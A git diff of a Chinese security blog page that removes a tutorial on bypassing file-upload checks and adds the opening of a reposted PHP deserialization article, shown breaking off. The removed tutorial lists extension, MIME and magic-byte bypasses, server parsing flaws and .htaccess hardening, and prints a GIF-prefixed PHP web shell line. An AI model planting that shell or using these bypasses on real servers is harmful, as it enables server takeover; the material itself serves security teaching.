@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="文件上传漏洞," />
+  <meta name="keywords" content="php,反序列化漏洞," />
 
 
 
@@ -86,17 +86,28 @@
 
 
 
-<meta name="description" content="一、文件上传漏洞介绍 通常web 站点会有用户注册功能，而当用户登入之后大多数情况下都会存在类似头像上传、附件上传一类的功能，这些功能点往往存在上传验证方式不严格的安全缺陷，是在web 渗透中非常关键的突破口，只要经过仔细测试分析来绕过上传验证机制，往往会造成被攻击者直接上传web 后门，进而控制整个web 业务的控制权，复杂一点的情况是结合webserver 的解析漏洞来上传后门获取权限。">
+<meta name="description" content="PHP反序列化漏洞老夫不才关注0.2852019.05.11 03:49:46字数 795阅读 907  0x00 何为类和对象 说到序列化和反序列化就不得不提到两个词：类和对象 那么什么是类，什么是对象 教科书式的答案是类是对象的抽象，对象是类的实例 那啥叫个抽象，啥叫个实例呢 简单的说，类就是对象的一个标准模板，而对象就是按照模板做出来的实物      一脸懵逼  举个栗子 人，是一个类 所有">
 <meta property="og:type" content="article">
-<meta property="og:title" content="文件上传漏洞绕过技巧">
-<meta property="og:url" content="https://abtgu.github.io/WEB%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/index.html">
+<meta property="og:title" content="PHP反序列化漏洞">
+<meta property="og:url" content="https://abtgu.github.io/WEB%E5%AE%89%E5%85%A8/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="abtgu的博客">
-<meta property="og:description" content="一、文件上传漏洞介绍 通常web 站点会有用户注册功能，而当用户登入之后大多数情况下都会存在类似头像上传、附件上传一类的功能，这些功能点往往存在上传验证方式不严格的安全缺陷，是在web 渗透中非常关键的突破口，只要经过仔细测试分析来绕过上传验证机制，往往会造成被攻击者直接上传web 后门，进而控制整个web 业务的控制权，复杂一点的情况是结合webserver 的解析漏洞来上传后门获取权限。">
-<meta property="article:published_time" content="2020-03-31T10:32:19.273Z">
-<meta property="article:modified_time" content="2020-03-31T13:14:09.380Z">
+<meta property="og:description" content="PHP反序列化漏洞老夫不才关注0.2852019.05.11 03:49:46字数 795阅读 907  0x00 何为类和对象 说到序列化和反序列化就不得不提到两个词：类和对象 那么什么是类，什么是对象 教科书式的答案是类是对象的抽象，对象是类的实例 那啥叫个抽象，啥叫个实例呢 简单的说，类就是对象的一个标准模板，而对象就是按照模板做出来的实物      一脸懵逼  举个栗子 人，是一个类 所有">
+<meta property="og:image" content="https://upload.jianshu.io/users/upload_avatars/9144690/84f72a09-e33b-4e82-9356-89912829fd00.jpg?imageMogr2/auto-orient/strip%7CimageView2/1/w/96/h/96/format/webp">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9144690-ae31339cb9846b1b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/272/format/webp">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9144690-c8a949a31304d500.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/216/format/webp">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9144690-2166e95ca5baef33.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/546/format/webp">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9144690-247cec07e75815be.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/509/format/webp">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9144690-6a1f68569e1b1e2e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/400/format/webp">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9144690-5e2ae1e0aa4b1218.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/450/format/webp">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9144690-2949f909bcab8fc0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/741/format/webp">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9144690-e7cf4e57fcaaca23.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/658/format/webp">
+<meta property="article:published_time" content="2020-05-04T07:27:19.121Z">
+<meta property="article:modified_time" content="2020-05-04T07:29:41.655Z">
 <meta property="article:author" content="abtgu">
-<meta property="article:tag" content="文件上传漏洞">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="反序列化漏洞">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://upload.jianshu.io/users/upload_avatars/9144690/84f72a09-e33b-4e82-9356-89912829fd00.jpg?imageMogr2/auto-orient/strip%7CimageView2/1/w/96/h/96/format/webp">
 
 
 
@@ -126,13 +137,13 @@
 
 
 
-  <link rel="canonical" href="https://abtgu.github.io/WEB安全/文件上传漏洞绕过技巧/"/>
+  <link rel="canonical" href="https://abtgu.github.io/WEB安全/php反序列化漏洞/"/>
 
 
 
 
 
-  <title>文件上传漏洞绕过技巧 | abtgu的博客</title>
+  <title>PHP反序列化漏洞 | abtgu的博客</title>
   
 
 
@@ -311,7 +322,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://abtgu.github.io/WEB%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">
+    <link itemprop="mainEntityOfPage" href="https://abtgu.github.io/WEB%E5%AE%89%E5%85%A8/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="abtgu">
@@ -328,7 +339,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">文件上传漏洞绕过技巧</h1>
+          <h1 class="post-title" itemprop="name headline">PHP反序列化漏洞</h1>
         
 
         <div class="post-meta">
@@ -340,8 +351,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-31T18:32:19+08:00">
-                2020-03-31
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-04T15:27:19+08:00">
+                2020-05-04
               </time>
             
 
@@ -356,8 +367,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-03-31T21:14:09+08:00">
-                2020-03-31
+              <time title="更新于" itemprop="dateModified" datetime="2020-05-04T15:29:41+08:00">
+                2020-05-04
               </time>
             
           </span>
@@ -412,197 +423,164 @@
       
 
       
-        <h1 id="一-文件上传漏洞介绍"><a class="markdownIt-Anchor" href="#一-文件上传漏洞介绍"></a> 一、文件上传漏洞介绍</h1>
-<p>通常web 站点会有用户注册功能，而当用户登入之后大多数情况下都会存在类似头像上传、附件上传一类的功能，这些功能点往往存在上传验证方式不严格的安全缺陷，是在web 渗透中非常关键的突破口，只要经过仔细测试分析来绕过上传验证机制，往往会造成被攻击者直接上传web 后门，进而控制整个web 业务的控制权，复杂一点的情况是结合webserver 的解析漏洞来上传后门获取权限。</p>
-<h1 id="二-验证方法与绕过"><a class="markdownIt-Anchor" href="#二-验证方法与绕过"></a> 二、验证方法与绕过</h1>
-<h2 id="11content-length验证"><a class="markdownIt-Anchor" href="#11content-length验证"></a> 1.1CONTENT-LENGTH验证</h2>
-<p>Content-Length验证是指服务器会对上传的文件内容长度进行检查，超出限制大小的文件将不允许被上传。虽然这种类型的验证不是很受欢迎，但在一些应用的文件上传中也时常能碰到。<br />
-示例：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"size"</span>] &gt; <span class="number">30</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry, your file is too large."</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="12content-length绕过"><a class="markdownIt-Anchor" href="#12content-length绕过"></a> 1.2CONTENT-LENGTH绕过</h2>
-<ol>
-<li>针对这种类型的验证，我们可以通过上传一些非常短的恶意代码来绕过。上传文件的大小取决于，（Web服务器上的最大长度限制，我们可以使用不同大小的文件来fuzzing上传程序，从而计算出它的限制范围）。</li>
-<li>如果截断上传文件最大大小，修改文件大小的限制，然后再发送给服务端。</li>
-</ol>
-<h2 id="21客户端javascript-检测通常为检测文件扩展名"><a class="markdownIt-Anchor" href="#21客户端javascript-检测通常为检测文件扩展名"></a> 2.1客户端javascript 检测(通常为检测文件扩展名)</h2>
-<p>顾名思义，就是在文件被上传到服务端的时候，对于文件名的扩展名进行检查，如果不合法，则拒绝这次上传。<br />
-有两种策略:黑名单策略，文件扩展名在黑名单中的为不合法。<br />
-示例代码:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$postfix = end(explode(<span class="string">'.'</span>,<span class="string">'$_POST['</span>filename<span class="string">']);</span></span><br><span class="line"><span class="string">if($postfix=='</span>php<span class="string">'||$postfix=='</span>asp<span class="string">'||$postfix=='</span>sh<span class="string">')&#123;</span></span><br><span class="line"><span class="string">echo "invalid file type";</span></span><br><span class="line"><span class="string">return;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
-<p>白名单策略，文件扩展名不在白名单中的均为不合法。<br />
-示例代码:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$postfix = end(explode(<span class="string">'.'</span>,<span class="string">'$_POST['</span>filename<span class="string">']);</span></span><br><span class="line"><span class="string">if($postfix=='</span>jpg<span class="string">'||$postfix=='</span>png<span class="string">'||$postfix=='</span>gif<span class="string">')&#123;</span></span><br><span class="line"><span class="string">//save the file and do something next</span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">echo "invalid file type";</span></span><br><span class="line"><span class="string">return;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
-<h2 id="21客户端javascript"><a class="markdownIt-Anchor" href="#21客户端javascript"></a> 2.1客户端javascript</h2>
-<p>黑名单绕过:<br />
-通过上传不受欢迎的php扩展来绕过黑名单。<br />
-例如：pht，phpt，phtml，php3，php4，php5，php6。<br />
-白名单绕过:<br />
-通过某种类型的技巧来绕过白名单，例如添加空字节注入（shell.php％00.gif），或使用双重扩展来上传文件（shell.jpg.php）。<br />
-此外，我们还可以尝试扩展名大小写来绕过，例如：pHp，Php，phP</p>
-<p>白名单策略是更加安全的，通过限制上传类型为只有我们接受的类型，可以较好的保证安全，因为黑名单我们可以使用各种方法来进行注入和突破。</p>
-<h2 id="3-服务端mime-类型检测检测content-type-内容"><a class="markdownIt-Anchor" href="#3-服务端mime-类型检测检测content-type-内容"></a> 3. 服务端MIME 类型检测(检测Content-Type 内容)</h2>
-<p>如：  content-Type:aplication/x-php<br />
-绕过方法：<br />
-改为如下类型：</p>
-<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-<span class="built_in">Type</span>: <span class="built_in">image</span>/jpg</span><br><span class="line">Content-<span class="built_in">Type</span>: <span class="built_in">image</span>/png</span><br><span class="line">Content-<span class="built_in">Type</span>: <span class="built_in">image</span>/jpeg</span><br><span class="line">Content-<span class="built_in">Type</span>: <span class="built_in">image</span>/gif</span><br></pre></td></tr></table></figure>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">常用的MIMETYPE表</span><br><span class="line"><span class="built_in">text</span>/plain（纯文本）</span><br><span class="line"><span class="built_in">text</span>/html（HTML文档）</span><br><span class="line"><span class="built_in">text</span>/javascript（js代码）</span><br><span class="line"><span class="built_in">application</span>/xhtml+xml（XHTML文档）</span><br><span class="line">image/gif（GIF图像）</span><br><span class="line">image/jpeg（JPEG图像）</span><br><span class="line">image/png（PNG图像）</span><br><span class="line">video/mpeg（MPEG动画）</span><br><span class="line"><span class="built_in">application</span>/octet-stream（二进制数据）</span><br><span class="line"><span class="built_in">application</span>/pdf（PDF文档）</span><br><span class="line"><span class="built_in">application</span>/(编程语言) 该种语言的代码</span><br><span class="line"><span class="built_in">application</span>/msword（Microsoft Word文件）</span><br><span class="line">message/rfc822（RFC <span class="number">822</span>形式）</span><br><span class="line">multipart/alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）</span><br><span class="line"><span class="built_in">application</span>/x-www-form-urlencoded（POST方法提交的表单）</span><br><span class="line">multipart/form-data（POST提交时伴随文件上传的表单）</span><br></pre></td></tr></table></figure>
-<h2 id="4分析文件头内容来检查文件类型"><a class="markdownIt-Anchor" href="#4分析文件头内容来检查文件类型"></a> 4.分析文件头内容来检查文件类型</h2>
-<p>一种检查类型的方式是使用对于文件内容的验证机制，这种方法利用的是每一个特定类型的文件都会有不太一样的开头或者标志位。可以通过比如php的exif_imagetype()函数<br />
-一个通过这种方法来过滤的示例代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! exif_imagetype($_FILES[<span class="string">'uploadedfile'</span>][<span class="string">'tmp_name'</span>])) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File is not an image"</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>绕过方法：<br />
-给上传脚本加上相应的幻数头字节就可以，php引擎会将 &lt;?之前的内容当作html文本，不解释而跳过之，后面的代码仍然能够得到执行比如下面：</p>
-<p>（一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符。）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"></span><br><span class="line">&lt;? </span><br><span class="line">php echo shell_exec($_GET[&#39;cmd&#39;]);</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
-<p>图片文件通常有称作幻数的头字节，我们来看一下几种图片文件的幻数：<br />
-（注意！下面是二进制而不是文本格式的数据）<br />
-JPG</p>
-<p>PNG</p>
-<p>如果是其他类型的二进制文件，也有响应的头字节，如下表</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">格式</th>
-<th style="text-align:center">文件头</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">TIFF (tif)</td>
-<td style="text-align:center">49492A00</td>
-</tr>
-<tr>
-<td style="text-align:center">Windows Bitmap (bmp)</td>
-<td style="text-align:center">424D</td>
-</tr>
-<tr>
-<td style="text-align:center">CAD (dwg)</td>
-<td style="text-align:center">41433130</td>
-</tr>
-<tr>
-<td style="text-align:center">Adobe Photoshop (psd)</td>
-<td style="text-align:center">38425053</td>
-</tr>
-<tr>
-<td style="text-align:center">Rich Text Format (rtf)</td>
-<td style="text-align:center">7B5C727466</td>
-</tr>
-<tr>
-<td style="text-align:center">MS Word/Excel (xls.or.doc)</td>
-<td style="text-align:center">D0CF11E0</td>
-</tr>
-<tr>
-<td style="text-align:center">MS Access (mdb)</td>
-<td style="text-align:center">5374616E64617264204A</td>
-</tr>
-<tr>
-<td style="text-align:center">ZIP Archive (zip)</td>
-<td style="text-align:center">504B0304</td>
-</tr>
-<tr>
-<td style="text-align:center">RAR Archive (rar)</td>
-<td style="text-align:center">52617221</td>
-</tr>
-<tr>
-<td style="text-align:center">Wave (wav)</td>
-<td style="text-align:center">57415645</td>
-</tr>
-<tr>
-<td style="text-align:center">AVI (avi)</td>
-<td style="text-align:center">41564920</td>
-</tr>
-<tr>
-<td style="text-align:center">Real Media (rm)</td>
-<td style="text-align:center">2E524D46</td>
-</tr>
-<tr>
-<td style="text-align:center">MPEG (mpg)</td>
-<td style="text-align:center">000001BA</td>
-</tr>
-<tr>
-<td style="text-align:center">MPEG (mpg)</td>
-<td style="text-align:center">000001B3</td>
-</tr>
-<tr>
-<td style="text-align:center">Quicktime (mov)</td>
-<td style="text-align:center">6D6F6F76</td>
-</tr>
-<tr>
-<td style="text-align:center">Adobe Acrobat (pdf)</td>
-<td style="text-align:center">255044462D312E</td>
-</tr>
-<tr>
-<td style="text-align:center">Windows Media (asf)</td>
-<td style="text-align:center">3026B2758E66CF11</td>
-</tr>
-<tr>
-<td style="text-align:center">MIDI (mid)</td>
-<td style="text-align:center">4D546864</td>
-</tr>
-</tbody>
-</table>
-<h2 id="5文件加载检测"><a class="markdownIt-Anchor" href="#5文件加载检测"></a> 5.文件加载检测</h2>
-<p>一般是调用API 或函数去进行文件加载测试，常见的是图像渲染测试，再变态点的甚至是进行二次渲染(后面会提到)。<br />
-对渲染/加载测试的攻击方式是代码注入绕过；对二次渲染的攻击方式是攻击文件加载器自身。<br />
-先说下对渲染/加载测试攻击-代码注入绕过,可以用图像处理软件对一张图片进行代码注入。用winhex看数据可以分析出这类工具的原理是在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的注释区。对于渲染测试基本上都能绕过，毕竟本身的文件结构是完整的。</p>
-<p>但如果碰到变态的二次渲染,基本上就没法绕过了，估计就只能对文件加载器进行攻击了。<br />
-一般进行遇到二次渲染，想绕过，它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了。能想到的一个思路就是基于数据二义性，即让数据既是图像数据也包含一句话木马代码，就像shellcode 通过数据二义性绕过IDS 检测特殊字符一样的道理。<br />
-如果要对文件加载器进行攻击，常见的就是溢出攻击，上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode比如access/mdb 溢出如果要对文件加载器进行攻击，常见的就是溢出攻击，上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode比如access/mdb 溢出。<br />
-总之对文件完整性检测的绕过，通常就直接用个结构完整的文件进行代码注入即可没必要再去测到底是检查的幻数还是文件头结构之类的了。<br />
-解析攻击<br />
-攻击角度来分是这样的:<br />
-直接解析(完全没防御或有一点简单的防御)<br />
-比如我们直接就可以上传一个扩展名是.php的文件,只需要简单地绕过客户端javascript 检测或者服务端MIME 类型检测就行了。<br />
-配合解析(有一定程度的防御)<br />
-我们可以理解为先代码注入到服务器上，上传一个带有一句话木马的图片或文件之类<br />
-让它待在某个位置，等待这一个解析的配合。(比如php 的文件包含解析，web 服务器的解析漏洞，.htaccess 解析等)</p>
-<p>本地文件包含解析<br />
-主要是php 的本地文件包含(远程文件包含不属于上传攻击绕过范畴)</p>
-<p>htaccess解析<br />
-就不用多说了，看看之前.htaccess 文件攻击的那个案例,用户自己定义如何去调用解析器解析文件就可以了。<br />
-web应用程序解析漏洞以及其原理</p>
-<p>Apache 解析漏洞<br />
-解析: test.php.任意不属于黑名单且也不属于Apache解析白名单的名称<br />
-描述: 一个文件名为x1.x2.x3 的文件，Apache 会从x3 的位置往x1 的位置开始尝试解析,<br />
-如果x3 不属于Apache 能解析的扩展名，那么Apache会尝试去解析x2 的位置，这样一直往前尝试，直到遇到一个能解析的扩展名为止</p>
-<p>IIS 解析漏洞<br />
-解析- test.asp/任意文件名|test.asp; 任意文件名| 任意文件名/任意文件名.php<br />
-描述- IIS6.0 在解析asp 格式的时候有两个解析漏洞，一个是如果目录名包含”.asp”字符串，那么这个目录下所有的文件都会按照asp 去解析，另一个是只要文件名中含有”.asp;”会优先按asp 来解析。<br />
-IIS7.0/7.5 是对php 解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串”/任意文件名.php”就会按照php 的方式去解析。</p>
-<p>Nginx 解析漏洞<br />
-解析- 任意文件名/任意文件名.php | 任意文件名%00.php<br />
-描述- 目前Nginx 主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php<br />
-的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php 进行解析攻击。还有一种是对低版本的Nginx 可以在任意文件名后面添加%00.php 进行解析攻击。</p>
-<h2 id="6限制web-server对于特定类型文件的行为"><a class="markdownIt-Anchor" href="#6限制web-server对于特定类型文件的行为"></a> 6.限制Web Server对于特定类型文件的行为</h2>
-<p>导致文件上传漏洞的根本原因在于服务把用户上传的本应是数据的内容当作了代码，一般来说，用户上传的内容都会被存储到特定的一个文件夹下，比如我们很多人习惯于放在 ./upload/ 下面要防止数据被当作代码执行，我们可以限制web server对于特定文件夹的行为。<br />
-大多数服务端软件都可以支持用户对于特定类型文件的行为的自定义，以Apache为例：<br />
-在默认情况下，对与 .php文件Apache会当作代码来执行，对于 html,css,js文件，则会直接由HTTP Response交给客户端程序对于一些资源文件，比如txt，doc，rar等等，则也会以文件下载的方式传送的客户端。我们希望用户上传的东西仅仅当作资源和数据而不能当作代码，因此可以使用服务器程序的接口来进行限制。<br />
-以Apache为例,我们可以利用 .htaccess 文件机制来对web server行为进行限制<br />
-在这里插一句，如果不是专门的文件下载目录，请务必关掉文件夹浏览的权限，以防止嗅探和可能的越权，也是使用.htaccess文件，在其中加上一句</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">Options</span></span> <span class="literal">All</span> -Indexes</span><br></pre></td></tr></table></figure>
-<p>即可。<br />
-禁止脚本执行有多种方式可以实现，而且分别有不同的效果，我们分别来看一下</p>
-<ol>
-<li>指定特定扩展名的文件的处理方式,原理是指定Response的Content-Type可以加上如下几行</li>
-</ol>
-<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType text/plain <span class="string">.pl</span> <span class="string">.py</span> <span class="string">.php</span></span><br></pre></td></tr></table></figure>
-<p>这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的Content-Type<br />
-2. 如果要完全禁止特定扩展名的文件被访问，用下面的几行</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Options</span> <span class="selector-tag">-ExecCGI</span></span><br><span class="line"><span class="selector-tag">AddHandler</span> <span class="selector-tag">cgi-script</span> <span class="selector-class">.php</span> <span class="selector-class">.pl</span> <span class="selector-class">.py</span> <span class="selector-class">.jsp</span> <span class="selector-class">.asp</span> <span class="selector-class">.htm</span> <span class="selector-class">.shtml</span> <span class="selector-class">.sh</span> <span class="selector-class">.cgi</span>识别</span><br></pre></td></tr></table></figure>
-<p>在这种情况下，以上几种类型的文件被访问的时候，会返回403 Forbidden的错误<br />
-3. 也可以强制web服务器对于特定文件类型的处理，与第一条不同的是， 下面的方法直接强行让apache将文件识别为你指定的类型，而第一种是让浏览器</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch "\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$"&gt;</span></span><br><span class="line"><span class="attribute">ForceType</span> text/plain</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
-<p>看代码就可以很明白的知道，符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型。<br />
-4. 只允许访问特定类型的文件</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Files ^(*.jpeg|*.jpg|*.png|*.gif)&gt;</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">order</span></span> deny,allow</span><br><span class="line"><span class="attribute"><span class="nomarkup">deny</span></span> from <span class="literal">all</span></span><br><span class="line"><span class="section">&lt;/Files&gt;</span></span><br></pre></td></tr></table></figure>
-<p>在一个上传图片的文件夹下面，就可以加上这段代码，使得该文件夹里面只有图片扩展名的文件才可以被访问，其他类型都是拒绝访问。<br />
-这又是一个白名单的处理方案。<br />
-永远记得，白名单是最有保障的安全措施。</p>
-<h1 id="三-反制"><a class="markdownIt-Anchor" href="#三-反制"></a> 三、反制</h1>
-<p>可以通过 move_uploaded_file 函数把自己写的.htaccess 文件上传，覆盖掉服务器上的文件，来定义文件类型和执行权限如果做到了这一点，将获得相当大的权限。</p>
-<blockquote>
-<p>转载于:<a href="https://www.cnblogs.com/-wenli/p/9911556.html" target="_blank" rel="noopener">https://www.cnblogs.com/-wenli/p/9911556.html</a></p>
+        <section class="ouvJEz"><h1 class="_1RuRku">PHP反序列化漏洞</h1><div class="rEsl9f"><div class="_2mYfmT"><a class="_1OhGeD" href="/u/29d552d51bf3" target="_blank" rel="noopener noreferrer"><img class="_13D2Eh" src="https://upload.jianshu.io/users/upload_avatars/9144690/84f72a09-e33b-4e82-9356-89912829fd00.jpg?imageMogr2/auto-orient/strip|imageView2/1/w/96/h/96/format/webp" alt=""></a><div style="margin-left: 8px;"><div class="_3U4Smb"><span class="FxYr8x"><a class="_1OhGeD" href="/u/29d552d51bf3" target="_blank" rel="noopener noreferrer">老夫不才</a></span><button data-locale="zh-CN" type="button" class="_3kba3h _1OyPqC _3Mi9q9 _34692-"><span>关注</span></button></div><div class="s-dsoj"><span class="_3tCVn5"><i aria-label="ic-diamond" class="anticon"><svg width="1em" height="1em" fill="currentColor" aria-hidden="true" focusable="false" class=""><use xlink:href="#ic-diamond"></use></svg></i><span>0.285</span></span><time datetime="2019-05-10T19:49:46.000Z">2019.05.11 03:49:46</time><span>字数 795</span><span>阅读 907</span></div></div></div></div><article class="_2rhmJa"><blockquote>
 </blockquote>
+<h3>0x00 何为类和对象</h3>
+<p>说到序列化和反序列化就不得不提到两个词：<code>类</code>和<code>对象</code></p>
+<p>那么什么是类，什么是对象</p>
+<p>教科书式的答案是类是对象的抽象，对象是类的实例<br>
+那啥叫个抽象，啥叫个实例呢<br>
+简单的说，类就是对象的一个标准模板，而对象就是按照模板做出来的实物<br>
+</p><div class="image-package">
+<div class="image-container" style="max-width: 272px; max-height: 262px; background-color: transparent;">
+<div class="image-container-fill" style="padding-bottom: 96.32%;"></div>
+<div class="image-view" data-width="272" data-height="262"><img data-original-src="//upload-images.jianshu.io/upload_images/9144690-ae31339cb9846b1b.png" data-original-width="272" data-original-height="262" data-original-format="image/png" data-original-filesize="33334" data-image-index="0" style="cursor: zoom-in;" class="" src="//upload-images.jianshu.io/upload_images/9144690-ae31339cb9846b1b.png?imageMogr2/auto-orient/strip|imageView2/2/w/272/format/webp"></div>
+</div>
+<div class="image-caption">一脸懵逼</div>
+</div><br>
+举个栗子<br>
+<code>人</code>，是一个类<br>
+所有的<code>人</code>都有一个脑袋两个胳膊两个腿<br>
+这个就是关于所有人的一个标准模板<p></p>
+<p>而对象呢，对象跑了...nnp<br>
+假设一个真实存在的对象小芳，村里有个姑娘叫小芳，她的脑袋倍儿锃亮<br>
+这个就是一个具体的人了，小芳就是按照人的模板实际出来的一个实物</p>
+<br>
+<div class="image-package">
+<div class="image-container" style="max-width: 216px; max-height: 280px; background-color: transparent;">
+<div class="image-container-fill" style="padding-bottom: 129.63%;"></div>
+<div class="image-view" data-width="216" data-height="280"><img data-original-src="//upload-images.jianshu.io/upload_images/9144690-c8a949a31304d500.png" data-original-width="216" data-original-height="280" data-original-format="image/png" data-original-filesize="103869" data-image-index="1" style="cursor: zoom-in;" class="" src="//upload-images.jianshu.io/upload_images/9144690-c8a949a31304d500.png?imageMogr2/auto-orient/strip|imageView2/2/w/216/format/webp"></div>
+</div>
+<div class="image-caption">小芳表示不想见你</div>
+</div><br>
+<p>代码里具体是这样实现的</p>
+<div class="_2Uzcx_"><button class="VJbwyy" type="button" aria-label="复制代码"><i aria-label="icon: copy" class="anticon anticon-copy"><svg viewBox="64 64 896 896" focusable="false" class="" data-icon="copy" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M832 64H296c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h496v688c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V96c0-17.7-14.3-32-32-32zM704 192H192c-17.7 0-32 14.3-32 32v530.7c0 8.5 3.4 16.6 9.4 22.6l173.3 173.3c2.2 2.2 4.7 4 7.4 5.5v1.9h4.2c3.5 1.3 7.2 2 11 2H704c17.7 0 32-14.3 32-32V224c0-17.7-14.3-32-32-32zM350 856.2L263.9 770H350v86.2zM664 888H414V746c0-22.1-17.9-40-40-40H232V264h432v624z"></path></svg></i></button><pre class="line-numbers  language-php"><code class="  language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
